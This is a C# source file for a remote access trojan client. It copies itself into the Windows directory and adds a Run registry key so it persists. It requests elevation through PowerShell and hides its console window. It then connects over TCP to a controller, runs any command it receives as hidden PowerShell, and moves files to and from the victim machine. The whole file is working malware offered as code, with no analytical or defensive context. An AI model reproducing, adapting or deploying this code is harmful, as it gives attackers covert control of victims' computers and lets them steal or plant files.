using System.Diagnostics;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using Microsoft.Win32;

if (Environment.ProcessPath != @"C:\Windows\client.exe")
{
    string path = @"C:\Windows\client.exe";

    if (!File.Exists(path))
    {
        File.Copy(Environment.ProcessPath, path);
    }

    RegistryKey registry;
    registry = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true);
    registry.SetValue("client", path);

    var processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = "powershell.exe";
    processStartInfo.Arguments = $@"Start-Process {path} -Verb runAs";
    processStartInfo.UseShellExecute = false;
    processStartInfo.RedirectStandardOutput = true;

    using var process = new Process();
    process.StartInfo = processStartInfo;
    process.Start();

    Environment.Exit(0);
}

[DllImport("user32.dll")]
static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

[DllImport("kernel32.dll")]
static extern IntPtr GetConsoleWindow();

const int SW_HIDE = 0;
const int SW_SHOW = 5;

var handle = GetConsoleWindow();
ShowWindow(handle, SW_HIDE);

string host = "127.0.0.1";
int port = 8802;
string? computerName = System.Environment.MachineName;

TcpClient client = new TcpClient();
StreamReader? Reader = null;
StreamWriter? Writer = null;

Restart();

Writer?.Close();
Reader?.Close();

async Task Restart()
{
    ClearConnection();
    bool restart = true;
    do
    {
        restart = false;
        try
        {
            client.Connect(host, port);
            Reader = new StreamReader(client.GetStream());
            Writer = new StreamWriter(client.GetStream());
            if (Writer is null || Reader is null) return;
            Task.Run(() => ReceiveMessageAsync(Reader));
            await Writer.WriteLineAsync(computerName);
            await Writer.FlushAsync();
            await CheckConnectedAsync();
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
            restart = true;
            ClearConnection();
            Thread.Sleep(5000);
        }
    } while (restart);
}

async Task CheckConnectedAsync()
{
    while (true)
    {
        if (!client.Connected) Restart();
    }
}

async Task SendMessageAsync(string message)
{
    await Writer.WriteLineAsync(message);
    await Writer.FlushAsync();
}

async Task ReceiveMessageAsync(StreamReader reader)
{
    while (true)
    {
        try
        {
            string? message = await reader.ReadLineAsync();
            if (string.IsNullOrEmpty(message)) continue;
            Print(message);
            if (message.StartsWith("dload-func"))
            {
                await SendFileAsync(message.Replace("dload-func ", string.Empty));
            }
            else if (message.StartsWith("upload-func"))
            {
                await RecieveFileAsync(message.Replace("upload-func ", string.Empty));
            }
            else ShellCommand(message);
        }
        catch
        {
            break;
        }
    }
}

async void ShellCommand(string command)
{
    var processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = "powershell.exe";
    processStartInfo.Arguments = $"{command}";
    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    processStartInfo.UseShellExecute = false;
    processStartInfo.RedirectStandardOutput = true;

    using var process = new Process();
    process.StartInfo = processStartInfo;
    process.Start();
    string output = process.StandardOutput.ReadToEnd();
    Console.WriteLine(output);
    await Writer.WriteLineAsync(output);
    await Writer.FlushAsync();
}

void ClearConnection()
{
    client.Close();
    client = new TcpClient();
    Reader = null;
    Writer = null;
}

async Task SendFileAsync(string path)
{
    try
    {
        await Writer.WriteLineAsync($"dload-func {path}");
        await Writer.FlushAsync();
        string? response = await Reader.ReadLineAsync();
        if (response == "dload-ready")
        {
            byte[] fileData = File.ReadAllBytes(path);
            string base64Data = Convert.ToBase64String(fileData);
            await Writer.WriteLineAsync(base64Data);
            await Writer.FlushAsync();
            Console.WriteLine("File sent: " + path);
        }
    }
    catch (Exception e)
    {
        Console.WriteLine($"Sending error: {e.Message}");
    }
}

async Task RecieveFileAsync(string path)
{
    await Writer.WriteLineAsync($"upload-func {path}");
    await Writer.FlushAsync();
    string fileName = Path.GetFileName(path);
    string savePath = $@"C:\Users\{Environment.UserName}\Downloads\{Path.GetFileNameWithoutExtension(path)}_(upload-func){Path.GetExtension(path)}";
    try
    {
        await Writer.WriteLineAsync("upload-ready");
        await Writer.FlushAsync();
        string base64Data = await Reader.ReadLineAsync();
        byte[] fileData = Convert.FromBase64String(base64Data);
        File.WriteAllBytes(savePath, fileData);
        Console.WriteLine("File saved as: " + savePath);
    }
    catch (Exception e)
    {
        Console.WriteLine($"Receiving error: {e.Message}");
    }
}

void Print(string message)
{
    if (OperatingSystem.IsWindows())
    {
        var position = Console.GetCursorPosition();
        int left = position.Left;
        int top = position.Top;
        Console.MoveBufferArea(0, top, left, 1, 0, top + 1);
        Console.SetCursorPosition(0, top);
        Console.WriteLine(message);
        Console.SetCursorPosition(left, top + 1);
    }
    else Console.WriteLine(message);
}